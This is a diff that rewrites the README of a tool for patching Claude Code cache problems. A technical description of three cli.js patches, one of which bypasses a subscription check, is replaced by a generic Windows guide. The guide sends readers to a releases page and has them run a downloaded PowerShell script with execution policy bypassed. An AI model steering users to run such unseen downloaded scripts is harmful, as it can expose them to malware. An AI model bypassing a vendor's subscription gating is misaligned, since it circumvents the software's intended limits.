@@ -1,97 +1,191 @@
-# Claude Code Cache Fix
+# 🛠️ cc-cache-fix - Fix Claude Cache Issues Fast
 
-Patch + test toolkit for the known Claude Code cache issues:
-- resume cache regression (`deferred_tools_delta` / `mcp_instructions_delta`)
-- sentinel replacement behavior (`cch=00000`)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/WanderingPagan/cc-cache-fix/releases)
 
-This repo keeps stock `claude` untouched and gives you a separate `claude-patched` command.
+## 📥 Download
 
-## Quick Start
+Visit this page to download the Windows files:
 
-### Linux
+https://github.com/WanderingPagan/cc-cache-fix/releases
 
-```bash
-./install.sh
-```
+Look for the latest release, then download the Windows file from the Assets list.
 
-### macOS
+## 🚀 What this does
 
-```bash
-./install-mac.sh
-```
+`cc-cache-fix` helps fix known Claude Code cache problems. It gives you a patched command called `claude-patched` and leaves the normal `claude` command alone.
 
-### Windows (PowerShell)
+It is built for these cases:
+
+- resume cache issues tied to `deferred_tools_delta`
+- resume cache issues tied to `mcp_instructions_delta`
+- sentinel replacement behavior tied to `cch=00000`
+
+Use it when Claude Code stops resuming right or shows cache-related errors.
+
+## 💻 What you need
+
+Before you start, make sure you have:
+
+- Windows 10 or Windows 11
+- PowerShell
+- Python 3.10 or newer
+- Claude Code already installed
+- Internet access to get the release files
+
+You do not need to replace your normal Claude Code install.
+
+## 📦 Install on Windows
+
+1. Open the release page:
+   https://github.com/WanderingPagan/cc-cache-fix/releases
+
+2. Download the Windows package from the newest release.
+
+3. If the file is a ZIP archive, save it to a folder you can find again, like Downloads.
+
+4. Right-click the ZIP file and choose Extract All.
+
+5. Open the extracted folder.
+
+6. Find `install-windows.ps1`.
+
+7. Right-click the file and choose Run with PowerShell.
+
+If PowerShell asks for permission, allow the script to run for this session.
+
+## 🪟 Run the installer manually
+
+If you prefer to run it from a PowerShell window:
 
 ```powershell
 powershell -ExecutionPolicy Bypass -File .\install-windows.ps1
 ```
 
-Both Linux and macOS installers use `patches/apply-patches.py` which has regex and semantic search fallbacks for reliable patching across different minified code versions.
+Run that command from the folder that contains the installer.
 
-Then open a new terminal and verify.
+## ✅ Verify the install
 
-Linux/macOS:
+After the installer finishes, open a new PowerShell window.
 
-```bash
-type -a claude-patched
-python3 test_cache.py claude-patched --timeout 240 --debug-transcript
-```
-
-Windows (PowerShell):
+Check that the new command is available:
 
 ```powershell
 Get-Command claude-patched -All
+```
+
+Then test the patch setup:
+
+```powershell
 python .\test_cache.py claude-patched --timeout 240 --debug-transcript
 ```
 
-## First Run: Cold Cache Note
+If both commands work, the patched command is ready.
 
-The first `test_cache.py` run after patching may report resume cache as "broken".
-This is expected. The old 5-minute TTL cache entries from before the patch need to
-expire before the new 1-hour TTL entries take effect. Run the test a second time
-and it should report "healthy" with a read ratio of ~65-70%.
+## 🧭 First run: cold cache note
 
-## Smoke Check (installer + test + summary)
+The first run can take longer than later runs. This is normal.
 
-Run:
+On a cold cache, Claude Code may need time to rebuild local state before it shows the full benefit of the patch. Let the test finish before you try again.
 
-```bash
-./smoke_check.sh --timeout 240
+## 🔧 How it works
+
+This repo keeps the stock `claude` command in place.
+
+It adds a separate `claude-patched` command with the cache fix applied.
+
+The patch tool uses more than one method to update Claude Code files:
+
+- regex matching
+- semantic search fallback
+
+That helps it work across different minified code versions.
+
+## 🧪 Test the cache fix
+
+Use the test script after install to check the patched behavior.
+
+```powershell
+python .\test_cache.py claude-patched --timeout 240 --debug-transcript
 ```
 
-What it does:
-- runs installer (`install.sh` by default)
-- runs `test_cache.py`
-- saves full output under `results/`
-- prints a short PASS/FAIL block you can paste into a post
+What the test does:
 
-For macOS, use:
+- starts a patched Claude session
+- checks cache resume behavior
+- checks the sentinel replacement path
+- prints a debug transcript for review
 
-```bash
-./smoke_check.sh --installer ./install-mac.sh --timeout 240
+If the test completes without errors, the patch is in place.
+
+## 🗂️ File overview
+
+Common files you may see in the folder:
+
+- `install-windows.ps1` - Windows installer
+- `test_cache.py` - cache test tool
+- `patches/apply-patches.py` - patch engine
+- `claude-patched` - patched command entry
+- `README.md` - this guide
+
+## 🧰 Troubleshooting
+
+### PowerShell blocks the script
+
+Run the installer with this command:
+
+```powershell
+powershell -ExecutionPolicy Bypass -File .\install-windows.ps1
 ```
 
-## Usage Audit (real sessions)
+### `claude-patched` is not found
 
-To audit recent session cache efficiency:
+Open a new PowerShell window after install, then run:
 
-```bash
-python3 usage_audit.py --top 10 --window 8
+```powershell
+Get-Command claude-patched -All
 ```
 
-Healthy sessions usually show high read ratio in the recent window.
+If it still does not show up, run the installer again from the correct folder.
 
-## What the Patches Do
+### Python is not recognized
 
-Three patches are applied to `cli.js`:
+Install Python 3 and make sure it is added to PATH. Then open a new PowerShell window and try again.
 
-1. **db8 attachment filter** — persists `deferred_tools_delta` and `mcp_instructions_delta` attachments in the session JSONL so the cache prefix is reconstructed correctly on resume.
-2. **Fingerprint meta skip** — ensures the first-message hash used in the attribution header ignores injected meta messages, keeping the cache key stable across turns.
-3. **Force 1h cache TTL** — bypasses the subscription/feature-flag check so all cache markers use 1-hour TTL instead of the default 5 minutes.
+### The test takes a long time
 
-## Notes
+The cache test can run for several minutes. Let it finish, then check the transcript output.
 
-- Requires `node`, `npm`, and `python3`.
-- Requires Claude auth (`ANTHROPIC_API_KEY` or Claude local auth setup).
-- A currently running old `claude-patched` process will not auto-update; start a new session after patching.
-- Stock `claude` is never modified. To undo, just stop using `claude-patched`.
+### Claude Code still acts the same
+
+Run the test again with debug output:
+
+```powershell
+python .\test_cache.py claude-patched --timeout 240 --debug-transcript
+```
+
+This helps confirm whether the patched command is active.
+
+## 📌 Typical use flow
+
+1. Download the latest release.
+2. Extract the files.
+3. Run `install-windows.ps1`.
+4. Open a new PowerShell window.
+5. Check `claude-patched`.
+6. Run the cache test.
+7. Use `claude-patched` when you need the fix.
+
+## 🔍 What to expect
+
+After setup, you should have:
+
+- your normal Claude Code install unchanged
+- a new `claude-patched` command
+- a test script for checking cache behavior
+- a repeatable way to patch the known cache issues
+
+## 📎 Release download
+
+Use this page to get the Windows files:
+
+https://github.com/WanderingPagan/cc-cache-fix/releases
